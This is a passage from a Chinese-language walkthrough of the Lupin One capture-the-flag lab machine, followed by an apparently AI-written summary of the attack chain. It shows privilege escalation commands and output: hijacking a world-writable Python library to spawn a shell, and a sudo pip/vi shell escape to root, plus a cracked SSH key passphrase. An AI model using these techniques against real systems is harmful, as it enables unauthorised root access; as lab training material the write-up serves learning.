-rwxrwxrwx 1 root root 24087 Oct  4  2021 /usr/lib/python3.9/webbrowser.py
```

对 `webbrowser.py` 用户具有可写权限，我们写入提权代码，当以 `arsene` 用户执行`heist.py`文件时，导入 `webbrowser` 库，导致恶意代码执行，越权至 `arsene` 用户

```bash
icex64@LupinOne:/tmp$ sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
arsene@LupinOne:/tmp$ whoami
arsene
arsene@LupinOne:/tmp$ sudo -l
Matching Defaults entries for arsene on LupinOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User arsene may run the following commands on LupinOne:
    (root) NOPASSWD: /usr/bin/pip

```

### pip 提权

![[Pasted image 20260317232024.png]]

![[Pasted image 20260317232625.png]]

```bash
arsene@LupinOne:/$ sudo /usr/bin/pip config --editor /usr/bin/vi edit

root@LupinOne:/# whoami
root
root@LupinOne:/# id
uid=0(root) gid=0(root) groups=0(root)

root@LupinOne:/# cat /root/root.txt

3mp!r3{congratulations_you_manage_to_pwn_the_lupin1_box}
See you on the next heist.

```

成功提权至 `root`

# AI 总结

## 🎯 Lupin One 靶机实战通关总结

在本次 Lupin One 靶机的渗透测试中，我们完整地经历了一次从外部 Web 侦察到最终完全控制服务器内核（Root）的经典渗透流程。整条攻击链路环环相扣，涵盖了目录爆破、密码学暴力破解以及两种截然不同的 Linux 特权提升手法。

### 🗺️ 攻击链路全景图 (Kill Chain)

1. **信息收集与 Web 侦察**：`Nmap` 端口扫描 ➔ 发现 80 端口 ➔ `robots.txt` 提示模糊测试。
    
2. **突破口寻找 (Fuzzing)**：利用 `ffuf` 配合字典（带 `~` 和 `.` 前缀的深度枚举），成功绕过隐藏机制，发现加密的 SSH 私钥文件（`.mysecret.txt`）。
    
3. **初始凭证获取 (Initial Access)**：利用 `ssh2john` 提取私钥哈希，通过 `John The Ripper` 配合 `fasttrack` 字典离线爆破出密码（`P@55w0rd!`），成功以 `icex64` 用户身份 SSH 登录。
    
4. **横向提权 (Horizontal Escalation)**：发现 `icex64` 可通过 `sudo` 运行 `heist.py` ➔ 排查发现系统级 Python 库 `webbrowser.py` 存在严重权限错误 (777) ➔ 利用 **Python 库劫持**写入恶意代码 ➔ 成功切换至 `arsene` 用户。
    
5. **垂直提权 (Vertical Escalation)**：发现 `arsene` 可无密使用 `sudo` 运行 `pip` ➔ 利用 `pip config` 调用系统编辑器 ➔ 指定 `vi` 作为编辑器 ➔ 利用 `vi` 的 `:!/bin/bash` 外部命令逃逸特性（**GTFOBins 滥用**）➔ 最终拿下 `root` 权限。
    

---

### 💡 核心知识点与技术沉淀

在这台靶机中，有三个非常值得记录和反复咀嚼的技术点：

#### 1. Fuzzing（模糊测试）的深度应用

在常规 Web 目录扫描（如 dirsearch、dirb）全部失效时，不要轻易放弃。通过阅读页面提示或报错，灵活调整 Fuzzing 策略（例如本靶机中针对 `~FUZZ` 用户目录格式，以及隐藏文件 `.FUZZ` 格式的定向爆破），是撕开 Web 防线的关键。

#### 2. Python 库劫持 (Library Hijacking)

这是本次靶机中最精彩的逻辑漏洞。

- **漏洞成因**：系统管理员配置失误，将 Python 标准库文件 `/usr/lib/python3.9/webbrowser.py` 的权限设置为了 `777`（所有人可读写）。
    
- **利用机制**：当我们利用 `sudo` 以目标用户身份运行包含 `import webbrowser` 的脚本时，Python 会毫无防备地加载被我们篡改过的原生库文件。我们写入在顶部的恶意代码（`os.system("/bin/bash")`）就会以目标用户的特权执行，从而完成身份窃取。
    

#### 3. Sudo 滥用与 GTFOBins (`pip` 提权)

这揭示了 Linux 权限分配中极其常见的“过度信任”问题。

- 管理员为了方便，给了 `pip` 极高的 `sudo NOPASSWD` 权限。
    
- 但 `pip` 作为一个复杂的包管理器，自带了调用外部程序（如编辑器、编译器）的功能。通过强制让 `pip` 调用 `vi`，我们实际上获得了一个由 root 启动的 `vi` 进程。随后利用 `vi` 自带的 Shell 逃逸机制（`:!/bin/bash`），兵不血刃地拿到了最高权限。